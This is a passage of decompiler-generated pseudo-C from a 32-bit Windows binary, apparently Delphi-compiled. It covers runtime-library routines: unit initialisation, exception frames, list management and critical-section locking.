    if ( !v4 )
      break;
    ++a1;
    v2 = v1 + 10 * v2;
  }
  while ( v2 < 0x1F4 );
  return v1;
}

//----- (0040B194) --------------------------------------------------------
int sub_40B194()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40B2CA;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_41E5F0 )
  {
    sub_40A5EC(&dword_41E5FC);
    sub_40A440();
    sub_409BD8();
    sub_403BE8((int *)&off_41C230, (char *)dword_40966C, 22);
    sub_403BE8(dword_41C1F8, (char *)dword_4095EC, 7);
    sub_4034C8(&off_41C124);
    sub_403BE8(dword_41E5B4, (char *)dword_401004, 7);
    sub_403BE8(dword_41E58C, (char *)dword_401004, 7);
    sub_403BE8(dword_41E570, (char *)dword_401004, 7);
    sub_403BE8(dword_41E540, (char *)dword_401004, 12);
    sub_403BE8(dword_41E510, (char *)dword_401004, 12);
    sub_4034C8(dword_41E50C);
    sub_4034C8(&dword_41E508);
    sub_4034C8(&dword_41E504);
    sub_4034C8(&dword_41E500);
    sub_4034C8(&dword_41E4F8);
    sub_4034C8(&dword_41E4F4);
    sub_4034C8(&dword_41E4E8);
    sub_4034C8(&dword_41C0D0);
    sub_4034C8(&dword_41C0BC);
  }
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 401004: using guessed type int dword_401004[2];
// 4095EC: using guessed type int dword_4095EC[4];
// 40966C: using guessed type int dword_40966C[5];
// 41C0BC: using guessed type _DWORD dword_41C0BC;
// 41C0D0: using guessed type _DWORD dword_41C0D0;
// 41C124: using guessed type int *off_41C124;
// 41C1F8: using guessed type int dword_41C1F8[];
// 41C230: using guessed type int (*off_41C230)[3];
// 41E4E8: using guessed type int dword_41E4E8;
// 41E4F4: using guessed type int dword_41E4F4;
// 41E4F8: using guessed type int dword_41E4F8;
// 41E500: using guessed type int dword_41E500;
// 41E504: using guessed type int dword_41E504;
// 41E508: using guessed type int dword_41E508;
// 41E50C: using guessed type int dword_41E50C[];
// 41E510: using guessed type int dword_41E510[11];
// 41E540: using guessed type int dword_41E540[11];
// 41E570: using guessed type int dword_41E570[6];
// 41E58C: using guessed type int dword_41E58C[7];
// 41E5B4: using guessed type int dword_41E5B4[6];
// 41E5F0: using guessed type int dword_41E5F0;
// 41E5FC: using guessed type _DWORD *dword_41E5FC;

//----- (0040B2D4) --------------------------------------------------------
int __usercall sub_40B2D4@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int result; // eax
  unsigned int v5[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v5[2] = (unsigned int)&savedregs;
  v5[1] = (unsigned int)&loc_40B33C;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  if ( dword_41E5F0-- == 0 )
  {
    sub_4032D0(&dword_40A5FC);
    sub_4032EC(&dword_40A6E8);
    if ( byte_41E4C9 )
      sub_40351C((volatile __int32 *)&off_41C124, (__int32)&dword_40B350);
    sub_409B0C();
    sub_40A020(a1, a2, a3);
    sub_409C44();
    sub_40A460();
  }
  result = 0;
  __writefsdword(0, v5[0]);
  return result;
}
// 40A5FC: using guessed type int dword_40A5FC;
// 40A6E8: using guessed type int dword_40A6E8;
// 40B350: using guessed type int dword_40B350;
// 41C124: using guessed type int *off_41C124;
// 41E4C9: using guessed type char byte_41E4C9;
// 41E5F0: using guessed type int dword_41E5F0;

//----- (0040B354) --------------------------------------------------------
int sub_40B354()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40B379;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E600;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E600: using guessed type int dword_41E600;

//----- (0040B384) --------------------------------------------------------
void sub_40B384()
{
  --dword_41E600;
}
// 41E600: using guessed type int dword_41E600;

//----- (0040B38C) --------------------------------------------------------
int sub_40B38C()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40B3B1;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E604;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E604: using guessed type int dword_41E604;

//----- (0040B3BC) --------------------------------------------------------
void sub_40B3BC()
{
  --dword_41E604;
}
// 41E604: using guessed type int dword_41E604;

//----- (0040B474) --------------------------------------------------------
int sub_40B474()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40B499;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E608;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E608: using guessed type int dword_41E608;

//----- (0040B4A4) --------------------------------------------------------
void sub_40B4A4()
{
  --dword_41E608;
}
// 41E608: using guessed type int dword_41E608;

//----- (0040B4D8) --------------------------------------------------------
int sub_40B4D8()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40B51E;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_41E60C )
  {
    sub_4034C8(&off_41C2EC);
    sub_403BE8((int *)&off_41C2E4, (char *)dword_401004, 2);
  }
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 401004: using guessed type int dword_401004[2];
// 41C2E4: using guessed type char *off_41C2E4;
// 41C2EC: using guessed type int off_41C2EC;
// 41E60C: using guessed type int dword_41E60C;

//----- (0040B528) --------------------------------------------------------
void sub_40B528()
{
  --dword_41E60C;
}
// 41E60C: using guessed type int dword_41E60C;

//----- (0040BEA8) --------------------------------------------------------
void __usercall sub_40BEA8(PVOID a1@<eax>)
{
  _DWORD *v2; // edi
  int v3; // ebx
  const void *v4; // eax
  int v5; // ebx
  const void *v6; // eax
  SIZE_T ExceptionList; // [esp-Ch] [ebp-34h] BYREF
  void *v8; // [esp-8h] [ebp-30h]
  int *v9; // [esp-4h] [ebp-2Ch]
  void *v10; // [esp+0h] [ebp-28h]
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+Ch] [ebp-1Ch] BYREF
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v2 = (_DWORD *)sub_40C4B0(dword_41E618);
  v9 = &savedregs;
  v8 = &loc_40BF60;
  ExceptionList = (SIZE_T)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v3 = v2[2] - 1;
  if ( v3 >= 0 )
  {
    do
    {
      v4 = (const void *)sub_40C20C((int)v2, v3);
      VirtualQuery_0(v4, &Buffer, 0x1Cu);
      if ( !a1 || a1 == Buffer.AllocationBase )
        sub_40C11C(v2, v3);
      --v3;
    }
    while ( v3 != -1 );
  }
  v5 = (*(int (__stdcall **)(SIZE_T))(*(_DWORD *)dword_41E61C + 20))(ExceptionList) - 1;
  if ( v5 >= 0 )
  {
    do
    {
      ExceptionList = 28;
      v6 = (const void *)(*(int (**)(void))(*(_DWORD *)dword_41E61C + 24))();
      VirtualQuery_0(v6, &Buffer, ExceptionList);
      if ( !a1 || a1 == Buffer.AllocationBase )
        (*(void (__cdecl **)(void *, int *))(*(_DWORD *)dword_41E61C + 68))(v8, v9);
      --v5;
    }
    while ( v5 != -1 );
  }
  __writefsdword(0, (unsigned int)v8);
  v10 = &loc_40BF67;
  sub_40C514(dword_41E618);
}
// 41E618: using guessed type int dword_41E618;
// 41E61C: using guessed type int dword_41E61C;

//----- (0040BFC8) --------------------------------------------------------
_DWORD *__userpurge sub_40BFC8@<eax>(_DWORD *result@<eax>, char a2@<dl>, int a3@<ecx>, int a4, int a5)
{
  if ( a2 )
    result = (_DWORD *)sub_402CDC((int)result, a2);
  result[1] = a3;
  result[2] = a5;
  result[3] = a4;
  if ( a2 )
    return sub_402D34(result);
  return result;
}
// 40BFD7: variable 'a3' is possibly undefined
// 40BFE8: variable 'a2' is possibly undefined

//----- (0040C000) --------------------------------------------------------
void __usercall sub_40C000(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  _DWORD *v3; // eax

  v3 = sub_40BFC8(dword_40BFBC, 1, a1, a3, a2);
  sub_40C428(dword_41E620, (int)v3);
}
// 40BFBC: using guessed type int dword_40BFBC[3];
// 41E620: using guessed type int dword_41E620;

//----- (0040C02C) --------------------------------------------------------
char __userpurge sub_40C02C@<al>(_BYTE *a1@<eax>, _DWORD *a2@<edx>, int a3@<ecx>, int a4)
{
  int v5; // esi
  _BYTE **i; // ebx
  char result; // al

  if ( a4 < 0 )
    return 0;
  v5 = a4 + 1;
  for ( i = (_BYTE **)(a3 + 4); !sub_406E40(*i, a1); i += 2 )
  {
    if ( !--v5 )
      return 0;
  }
  result = 1;
  *a2 = *(i - 1);
  return result;
}

//----- (0040C06C) --------------------------------------------------------
char __userpurge sub_40C06C@<al>(int a1@<eax>, volatile __int32 *a2@<edx>, _DWORD *a3@<ecx>, int a4)
{
  int v4; // esi
  char v7; // [esp+Fh] [ebp-5h]

  if ( a4 < 0 )
    return 0;
  v4 = a4 + 1;
  while ( a1 != *a3 )
  {
    a3 += 2;
    if ( !--v4 )
      return 0;
  }
  v7 = 1;
  sub_40351C(a2, a3[1]);
  return v7;
}

//----- (0040C0B0) --------------------------------------------------------
int __usercall sub_40C0B0@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  int result; // eax

  v2 = sub_402D3C(a1, a2);
  v4 = v3;
  v5 = v2;
  result = (*(int (**)(void))(*v2 + 8))();
  if ( v4 > 0 )
    return sub_402D2C(v5);
  return result;
}
// 40C0B7: variable 'v3' is possibly undefined

//----- (0040C0D0) --------------------------------------------------------
int __usercall sub_40C0D0@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  int v4; // esi

  v4 = a1[2];
  if ( v4 == a1[3] )
    (*(void (**)(void))*a1)();
  *(_DWORD *)(a1[1] + 4 * v4) = a2;
  ++a1[2];
  if ( a2 )
    (*(void (__fastcall **)(_DWORD, int))(*a1 + 4))(0, a2);
  return v4;
}

//----- (0040C104) --------------------------------------------------------
_DWORD *__usercall sub_40C104@<eax>(_DWORD *a1@<eax>)
{
  sub_40C2E4(a1, 0);
  return sub_40C2A8(a1, 0);
}

//----- (0040C11C) --------------------------------------------------------
int __usercall sub_40C11C@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  int v4; // ecx
  int v5; // edi
  int result; // eax

  if ( a2 < 0 || a2 >= a1[2] )
    sub_40C1B8(a2, off_41DC24[0]);
  v5 = sub_40C20C((int)a1, a2);
  result = --a1[2];
  if ( a2 < result )
    result = sub_4026B0((char *)(a1[1] + 4 * a2 + 4), (char *)(a1[1] + 4 * a2), 4 * (result - a2));
  if ( v5 )
  {
    LOBYTE(v4) = 2;
    return (*(int (__fastcall **)(int, int))(*a1 + 4))(v4, v5);
  }
  return result;
}
// 40C175: variable 'v4' is possibly undefined
// 41DC24: using guessed type int **off_41DC24[3];

//----- (0040C17C) --------------------------------------------------------
int __usercall sub_40C17C@<eax>(int a1@<ebp>)
{
  return *(_DWORD *)(a1 + 4);
}

//----- (0040C180) --------------------------------------------------------
void __userpurge sub_40C180(
        unsigned __int8 *a1@<edx>,
        int a2@<ecx>,
        int a3@<ebx>,
        int a4@<ebp>,
        int a5@<esi>,
        DWORD a6,
        DWORD a7,
        DWORD a8,
        const ULONG_PTR *a9)
{
  int v11; // [esp+0h] [ebp-10h] BYREF
  char v12; // [esp+4h] [ebp-Ch]
  int v13; // [esp+8h] [ebp-8h]
  int v14; // [esp+Ch] [ebp-4h]

  v14 = a3;
  v13 = a5;
  sub_40C17C(a4);
  v11 = a2;
  v12 = 0;
  sub_40948C((int)dword_40B794, 1, a1, 0, (int)&v11);
  sub_402F98(a6, a7, a8, a9);
}
// 40B794: using guessed type int dword_40B794[3];

//----- (0040C1B8) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__fastcall sub_40C1B8(int a1, int **a2)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-14h] [ebp-18h] BYREF
  DWORD v6; // [esp-10h] [ebp-14h]
  void **v7; // [esp-Ch] [ebp-10h]
  const ULONG_PTR *v8; // [esp-8h] [ebp-Ch]
  unsigned int v9; // [esp-4h] [ebp-8h]
  char *v10; // [esp+0h] [ebp-4h] BYREF
  void *savedregs; // [esp+4h] [ebp+0h] BYREF

  v10 = 0;
  v7 = &savedregs;
  v6 = (DWORD)&loc_40C200;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_404B80(a2, &v10);
  sub_40C180((unsigned __int8 *)v10, a1, (int)a2, (int)&savedregs, a1, (DWORD)ExceptionList, v6, (DWORD)v7, v8);
  __writefsdword(0, v9);
  savedregs = &loc_40C207;
  return sub_4034C8(&v10);
}
// 40C1FA: bad sp value at call

//----- (0040C20C) --------------------------------------------------------
int __usercall sub_40C20C@<eax>(int a1@<eax>, int a2@<edx>)
{
  if ( a2 < 0 || a2 >= *(_DWORD *)(a1 + 8) )
    sub_40C1B8(a2, off_41DC24[0]);
  return *(_DWORD *)(*(_DWORD *)(a1 + 4) + 4 * a2);
}
// 41DC24: using guessed type int **off_41DC24[3];

//----- (0040C268) --------------------------------------------------------
int __usercall sub_40C268@<eax>(int a1@<eax>, int a2@<edx>)
{
  int i; // ecx

  for ( i = 0; i < *(_DWORD *)(a1 + 8) && a2 != *(_DWORD *)(*(_DWORD *)(a1 + 4) + 4 * i); ++i )
    ;
  if ( i == *(_DWORD *)(a1 + 8) )
    return -1;
  return i;
}

//----- (0040C288) --------------------------------------------------------
int __usercall sub_40C288@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  int v3; // eax
  int v4; // esi

  v3 = sub_40C268((int)a1, a2);
  v4 = v3;
  if ( v3 >= 0 )
    sub_40C11C(a1, v3);
  return v4;
}

//----- (0040C2A8) --------------------------------------------------------
_DWORD *__usercall sub_40C2A8@<eax>(_DWORD *result@<eax>, int a2@<edx>)
{
  _DWORD *v3; // ebx

  v3 = result;
  if ( a2 < result[2] || a2 > 0x7FFFFFF )
    result = sub_40C1B8(a2, off_41DBCC[0]);
  if ( a2 != v3[3] )
  {
    result = sub_4025C8(v3 + 1, 4 * a2);
    v3[3] = a2;
  }
  return result;
}
// 41DBCC: using guessed type int **off_41DBCC[9];

//----- (0040C2E4) --------------------------------------------------------
__int16 __usercall sub_40C2E4@<ax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  int v4; // eax
  int v5; // ebp
  int v6; // edi

  if ( a2 < 0 || a2 > 0x7FFFFFF )
    sub_40C1B8(a2, off_41DB94[0]);
  if ( a2 > a1[3] )
    sub_40C2A8(a1, a2);
  v4 = a1[2];
  if ( a2 <= v4 )
  {
    v5 = v4 - 1;
    if ( a2 <= v4 - 1 )
    {
      v6 = a2 - v4;
      do
      {
        LOWORD(v4) = sub_40C11C(a1, v5--);
        ++v6;
      }
      while ( v6 );
    }
  }
  else
  {
    LOWORD(v4) = sub_4028D4((char *)(a1[1] + 4 * v4), 4 * (a2 - v4), 0);
  }
  a1[2] = a2;
  return v4;
}
// 41DB94: using guessed type int **off_41DB94[23];

//----- (0040C358) --------------------------------------------------------
_DWORD *__usercall sub_40C358@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  _DWORD *v3; // esi

  if ( a2 )
    a1 = (_DWORD *)sub_402CDC((int)a1, a2);
  v2 = a2;
  v3 = a1;
  sub_402BAC(a1, 0);
  InitializeCriticalSection_0((LPCRITICAL_SECTION)(v3 + 2));
  v3[1] = sub_402BAC(&off_40B908, 1);
  *((_BYTE *)v3 + 32) = 0;
  if ( v2 )
    sub_402D34(v3);
  return v3;
}
// 40C366: variable 'a2' is possibly undefined
// 40B908: using guessed type void *off_40B908;

//----- (0040C3AC) --------------------------------------------------------
void __usercall sub_40C3AC(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  unsigned int v4[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v5; // [esp-4h] [ebp-Ch]
  char v6; // [esp+3h] [ebp-5h]
  _DWORD *v7; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v2 = sub_402D3C(a1, a2);
  v6 = v3;
  v7 = v2;
  sub_40C4B0((int)v2);
  v5 = &savedregs;
  v4[1] = (unsigned int)sub_40C40E;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_402BDC((_DWORD *)v7[1]);
  sub_402BCC(v7, v6 & 0xFC);
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_40C415;
  sub_40C514((int)v7);
  DeleteCriticalSection_0((LPCRITICAL_SECTION)(v7 + 2));
  if ( v6 > 0 )
    sub_402D2C(v7);
}
// 40C3B7: variable 'v3' is possibly undefined

//----- (0040C428) --------------------------------------------------------
void __usercall sub_40C428(int a1@<eax>, int a2@<edx>)
{
  unsigned int v3[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v4; // [esp-4h] [ebp-Ch]
  int v5; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v5 = a1;
  sub_40C4B0(a1);
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_40C4A4;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  if ( *(_BYTE *)(v5 + 32) == 1 || sub_40C268(*(_DWORD *)(v5 + 4), a2) == -1 )
  {
    sub_40C0D0(*(_DWORD **)(v5 + 4), a2);
  }
  else if ( *(_BYTE *)(v5 + 32) == 2 )
  {
    sub_40C1B8(a2, off_41DB84[0]);
  }
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_40C4AB;
  sub_40C514(v5);
}
// 41DB84: using guessed type int **off_41DB84[27];

//----- (0040C4B0) --------------------------------------------------------
int __usercall sub_40C4B0@<eax>(int a1@<eax>)
{
  EnterCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
  return *(_DWORD *)(a1 + 4);
}

//----- (0040C4C4) --------------------------------------------------------
void __usercall sub_40C4C4(int a1@<eax>, int a2@<edx>)
{
  unsigned int v3[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v4; // [esp-4h] [ebp-Ch]
  int v5; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v5 = a1;
  sub_40C4B0(a1);
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_40C507;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  sub_40C288(*(_DWORD **)(v5 + 4), a2);
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_40C50E;
  sub_40C514(v5);
}

//----- (0040C514) --------------------------------------------------------
void __usercall sub_40C514(int a1@<eax>)
{
  LeaveCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
}

//----- (0040C520) --------------------------------------------------------
_DWORD *__usercall sub_40C520@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  _DWORD *result; // eax

  v2 = sub_402D3C(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_40DD28((int)v2);
  result = sub_402BCC(v5, v4 & 0xFC);
  if ( v4 > 0 )
    return (_DWORD *)sub_402D2C(v5);
  return result;
}
// 40C527: variable 'v3' is possibly undefined

//----- (0040C54C) --------------------------------------------------------
_DWORD *__usercall sub_40C54C@<eax>(int *a1@<eax>, int (***a2)(void)@<edx>)
{
  if ( a2 )
    return (_DWORD *)(**a2)();
  else
    return sub_40C560(a1, 0);
}

//----- (0040C560) --------------------------------------------------------
_DWORD *__usercall sub_40C560@<eax>(int *a1@<eax>, int *a2@<edx>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-128h] BYREF
  DWORD v5; // [esp-8h] [ebp-124h]
  int *v6; // [esp-4h] [ebp-120h]
  const ULONG_PTR *v7; // [esp+0h] [ebp-11Ch]
  unsigned int v8; // [esp+4h] [ebp-118h]
  char *v9; // [esp+8h] [ebp-114h] BYREF
  void *v10; // [esp+Ch] [ebp-110h]
  char *v11; // [esp+10h] [ebp-10Ch]
  char v12; // [esp+14h] [ebp-108h]
  char v13[256]; // [esp+18h] [ebp-104h] BYREF
  char *v14; // [esp+118h] [ebp-4h] BYREF
  int savedregs; // [esp+11Ch] [ebp+0h] BYREF

  v14 = 0;
  v6 = &savedregs;
  v5 = (DWORD)&loc_40C616;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( a2 )
  {
    sub_402B5C(*a2, v13);
    sub_4036EC(&v14, v13);
  }
  else
  {
    sub_403560((volatile __int32 *)&v14, (__int32)&dword_40C62C);
  }
  v9 = v14;
  LOBYTE(v10) = 11;
  sub_402B5C(*a1, v13);
  v11 = v13;
  v12 = 4;
  sub_409548((int)dword_406844, 1, off_41DB9C[0], 1, (int)&v9);
  sub_402F98((DWORD)ExceptionList, v5, (DWORD)v6, v7);
  __writefsdword(0, v8);
  v10 = &loc_40C61D;
  return sub_4034C8(&v14);
}
// 406844: using guessed type int dword_406844[4];
// 40C62C: using guessed type int dword_40C62C;
// 41DB9C: using guessed type int **off_41DB9C[21];

//----- (0040C63C) --------------------------------------------------------
_DWORD *__usercall sub_40C63C@<eax>(int *a1@<eax>, char **a2@<edx>)
{
  int v4; // eax
  int *v5; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-11Ch] BYREF
  void *v8; // [esp-8h] [ebp-118h]
  int *v9; // [esp-4h] [ebp-114h]
  void *v10; // [esp+0h] [ebp-110h]
  char v11[256]; // [esp+Ch] [ebp-104h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v12; // [esp+10Ch] [ebp-4h] BYREF
  int savedregs; // [esp+110h] [ebp+0h] BYREF

  v12 = 0;
  v9 = &savedregs;
  v8 = &loc_40C6D1;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_402B5C(*a1, v11);
  sub_4036EC(a2, v11);
  sub_402C88(a1, -1);
  if ( v4 )
  {
    sub_402C88(a1, -1);
    sub_402C88(v5, -2);
    if ( v12 )
    {
      ExceptionList = v12;
      sub_4037E4((volatile __int32 *)a2, 3);
    }
  }
  __writefsdword(0, (unsigned int)v8);
  v10 = &loc_40C6D8;
  return sub_4034C8(&v12);
}
// 40C686: variable 'v4' is possibly undefined
// 40C69A: variable 'v5' is possibly undefined

//----- (0040C6F0) --------------------------------------------------------
_DWORD *__usercall sub_40C6F0@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  _DWORD *result; // eax

  v2 = sub_402D3C(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_40D0C8((int)v2, 0);
  result = sub_40C520(v5, v4 & 0xFC);
  if ( v4 > 0 )
    return (_DWORD *)sub_402D2C(v5);
  return result;
}
// 40C6F7: variable 'v3' is possibly undefined

//----- (0040C720) --------------------------------------------------------
int __usercall sub_40C720@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v4; // esi

  v4 = (*(int (**)(void))(*(_DWORD *)a1 + 20))();
  (*(void (__fastcall **)(int, int))(*(_DWORD *)a1 + 84))(a2, v4);
  return v4;
}

//----- (0040C744) --------------------------------------------------------
int __usercall sub_40C744@<eax>(int a1@<eax>, int a2@<ecx>)
{
  int v4; // esi

  v4 = (*(int (**)(void))(*(_DWORD *)a1 + 52))();
  (*(void (__fastcall **)(int, int))(*(_DWORD *)a1 + 36))(a2, v4);
  return v4;
}

//----- (0040C768) --------------------------------------------------------
_DWORD *__usercall sub_40C768@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  int v2; // eax
  int v3; // esi
  int v4; // ebx
  int v5; // eax
  _DWORD v7[3]; // [esp-18h] [ebp-30h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v9; // [esp-8h] [ebp-20h]
  int *v10; // [esp-4h] [ebp-1Ch]
  void *v11; // [esp+0h] [ebp-18h]
  int v12; // [esp+Ch] [ebp-Ch] BYREF
  int v13; // [esp+10h] [ebp-8h]
  _DWORD *v14; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v12 = 0;
  v13 = a2;
  v14 = a1;
  v10 = &savedregs;
  v9 = &loc_40C80F;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_40C890(a1);
  v7[2] = &savedregs;
  v7[1] = &loc_40C7F2;
  v7[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v2 = (*(int (__stdcall **)(_DWORD, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)v13 + 20))(
         v7[0],
         &loc_40C7F2,
         &savedregs,
         ExceptionList);
  if ( v2 - 1 >= 0 )
  {
    v3 = v2;
    v4 = 0;
    do
    {
      (*(void (__fastcall **)(int *, int))(*(_DWORD *)v13 + 12))(&v12, v4);
      v5 = (*(int (__cdecl **)(int))(*(_DWORD *)v13 + 24))(v12);
      (*(void (__thiscall **)(int))(*v14 + 56))(v5);
      ++v4;
      --v3;
    }
    while ( v3 );
  }
  __writefsdword(0, (unsigned int)v9);
  v11 = &loc_40C7F9;
  sub_40C94C(v14);
  __writefsdword(0, (unsigned int)v9);
  v11 = &loc_40C816;
  return sub_4034C8(&v12);
}

//----- (0040C820) --------------------------------------------------------
_DWORD *__usercall sub_40C820@<eax>(int *a1@<eax>, int (***a2)(void)@<edx>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-14h] BYREF
  void *v5; // [esp-8h] [ebp-10h]
  int *v6; // [esp-4h] [ebp-Ch]
  void *v7; // [esp+0h] [ebp-8h]
  int *v8; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v8 = a1;
  if ( !sub_402C40((int *)a2, (int)&off_40BA94) )
    return sub_40C54C(v8, a2);
  sub_40C890(v8);
  v6 = &savedregs;
  v5 = &loc_40C879;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*v8 + 64))(ExceptionList);
  (*(void (**)(void))(*v8 + 60))();
  __writefsdword(0, (unsigned int)v5);
  v7 = &loc_40C88A;
  return sub_40C94C(v8);
}
// 40BA94: using guessed type void *off_40BA94;

//----- (0040C890) --------------------------------------------------------
_DWORD *__usercall sub_40C890@<eax>(_DWORD *result@<eax>)
{
  _DWORD *v1; // ebx

  v1 = result;
  if ( !result[1] )
    result = (_DWORD *)(*(int (**)(void))(*result + 48))();
  ++v1[1];
  return result;
}

//----- (0040C8A8) --------------------------------------------------------
int __usercall sub_40C8A8@<eax>(int a1@<ebx>, int a2)
{
  int v2; // esi
  int v3; // eax

  v2 = *(_DWORD *)(*(_DWORD *)(a2 - 4) + 32);
  if ( v2 )
  {
    LOBYTE(a1) = 1;
    if ( sub_402C40(*(int **)(*(_DWORD *)(a2 - 4) + 32), (int)&off_40BA94) )
    {
      LOBYTE(v3) = sub_40C960(*(_DWORD *)(a2 - 8), v2);
      a1 = v3;
      LOBYTE(a1) = v3 ^ 1;
    }
  }
  else
  {
    LOBYTE(a1) = (*(int (**)(void))(**(_DWORD **)(a2 - 8) + 20))() > 0;
  }
  return a1;
}
// 40C8E0: variable 'v3' is possibly undefined
// 40BA94: using guessed type void *off_40BA94;

//----- (0040C900) --------------------------------------------------------
int __usercall sub_40C900@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ebx>)
{
  int v3; // eax
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v3 = sub_40C8A8(a3, (int)&savedregs);
  return (*(int (__fastcall **)(int, const char *, _DWORD *(__usercall *)@<eax>(int@<eax>, int *@<edx>), int, _DWORD *(__usercall *)@<eax>(_DWORD *@<eax>, _DWORD *@<edx>), int))(*(_DWORD *)a2 + 4))(
           v3,
           "Strings",
           sub_40D210,
           a1,
           sub_40CF60,
           a1);
}

